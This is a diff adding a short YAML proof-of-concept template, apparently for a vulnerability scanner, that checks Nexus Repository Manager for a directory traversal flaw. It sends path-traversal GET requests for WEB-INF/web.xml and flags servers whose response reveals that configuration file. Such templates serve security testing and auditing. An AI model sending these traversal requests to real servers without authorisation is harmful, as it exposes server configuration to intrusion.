@@ -1,0 +1,22 @@
+id: poc-yaml-nexus-repository-manager-directory-traversal
+info:
+  name: Nexus Repository Manager 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: Nexus Repository Manager
+  osprey-id: vb_2020_0076
+variables:
+  r_path: '/static//../WEB-INF/web.xml
+
+    /nexus/static//../WEB-INF/web.xml
+
+    '
+requests:
+- method: GET
+  path: '{{.r_path}}'
+  headers: {}
+  expression: 'contains(body, "<?xml") && contains(body, "<listener-class>org.sonatype.nexus.webapp.")
+
+    '
+transport: http
